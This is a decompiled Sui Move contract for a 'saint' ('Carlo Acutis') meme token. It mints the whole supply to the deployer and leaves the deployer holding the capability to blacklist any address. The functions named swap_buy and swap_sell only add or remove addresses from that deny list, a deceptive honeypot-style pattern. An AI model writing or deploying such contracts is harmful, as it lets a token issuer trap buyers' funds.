module 0x7f4dc7d1f08179f0179464ede410b4c17bbd103cc8ee010c9c9022104ccbef8d::saint {
    struct SAINT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SAINT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SAINT>(arg0, 9, b"saint", b"Carlo Acutis", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmazwGbNYhTcC6BDkTNJUkzAR4mZKShdKsLZAgAykVrVpt"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SAINT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SAINT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SAINT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SAINT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SAINT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SAINT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SAINT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SAINT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

